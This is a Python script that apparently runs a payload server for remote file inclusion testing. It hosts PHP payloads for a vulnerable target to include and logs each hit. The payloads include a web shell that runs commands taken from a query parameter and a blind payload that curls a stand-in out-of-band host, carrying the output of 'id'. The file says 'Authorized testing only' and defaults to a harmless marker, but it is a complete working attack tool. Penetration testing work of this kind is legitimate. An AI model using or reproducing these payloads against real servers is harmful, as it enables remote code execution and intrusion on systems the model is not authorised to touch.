#!/usr/bin/env python3
"""
payload_host.py — minimal HTTP server that hosts RFI payloads as text/plain (so they are NOT executed
on YOUR box) and logs every include hit with the source IP (your evidence). (RFI_TESTING_GUIDE.md §1/§5.)

Authorized testing only. Serves a benign execution-proof payload by default.

Usage:
  python3 payload_host.py --port 8000 --marker RFI-POC-7f3a9
  # then on the target:  ?page=http://YOUR_IP:8000/shell.txt?
  # files served:  /shell.txt (echo marker)   /cmd.txt (system($_GET[c]))   plus anything in --dir
"""
import argparse, http.server, os, socketserver, sys, datetime

class Handler(http.server.SimpleHTTPRequestHandler):
    marker = "RFI-POC-7f3a9"
    serve_dir = None

    def _log_hit(self):
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        print(f"[{ts}] INCLUDE HIT  src={self.client_address[0]}  \"{self.command} {self.path}\"  UA={self.headers.get('User-Agent','-')}")

    def _send(self, body: bytes, ctype="text/plain"):
        self.send_response(200)
        self.send_header("Content-Type", ctype)        # text/plain => target executes it, not us
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        self._log_hit()
        path = self.path.split("?", 1)[0].lstrip("/")
        # built-in payloads
        if path in ("", "shell.txt"):
            return self._send(f'<?php echo "RFI-EXEC-".(7*7*7); /* {self.marker} */ ?>'.encode())
        if path == "cmd.txt":
            return self._send(b'<?php system($_GET["c"]); ?>')
        if path == "blind.txt":
            return self._send(b'<?php system("curl -s http://YOUR_OOB/exec_$(id|tr \' \' _)"); ?>')
        if path == "sleep.txt":
            return self._send(b'<?php sleep(10); ?>')
        # files from --dir
        if self.serve_dir:
            fp = os.path.join(self.serve_dir, os.path.basename(path))
            if os.path.isfile(fp):
                return self._send(open(fp, "rb").read())
        self._send(b'<?php echo "RFI-EXEC-".(7*7*7); ?>')  # default

    def log_message(self, *a):  # silence default logging (we do our own)
        pass

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=8000)
    ap.add_argument("--marker", default="RFI-POC-7f3a9")
    ap.add_argument("--dir", help="optional dir of custom payload files to serve as text/plain")
    a = ap.parse_args()
    Handler.marker = a.marker
    Handler.serve_dir = a.dir
    print(f"[*] RFI payload host on 0.0.0.0:{a.port}  (payloads served as text/plain)")
    print(f"    target -> ?page=http://YOUR_IP:{a.port}/shell.txt?   (exec proof: RFI-EXEC-343)")
    print(f"    cmd    -> /cmd.txt  (&c=id)   blind -> /blind.txt   sleep -> /sleep.txt")
    print(f"[*] watching for include hits (source IP = the target server) ...\n")
    with socketserver.TCPServer(("0.0.0.0", a.port), Handler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[done]")

if __name__ == "__main__":
    main()
